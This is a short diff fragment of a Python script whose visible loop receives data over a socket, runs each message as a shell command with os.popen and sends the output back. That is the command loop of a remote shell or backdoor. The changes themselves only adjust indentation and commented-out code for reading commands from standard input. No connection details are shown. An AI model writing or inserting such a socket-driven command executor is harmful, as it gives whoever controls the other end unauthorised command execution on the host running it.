@@ -16,16 +16,17 @@ while (1):
 				if data:
 					print ('received: ' + data)
 					cmd = os.popen(data).read()
-                                        sock.send(cmd)
+					sock.send(cmd)
 				else:
 					sock.close()
 					sys.exit()
 			#else:
+				#print('readline')
 				#cmd = sys.stdin.readline()
 				#if cmd == "exit\n":
-				#	sys.exit()
-				#else:
-				#	sock.send(cmd)
+			#		sys.exit()
+			#	else:
+		 	#		sock.send(cmd)
 
 	except Exception as e:
 		print (e)
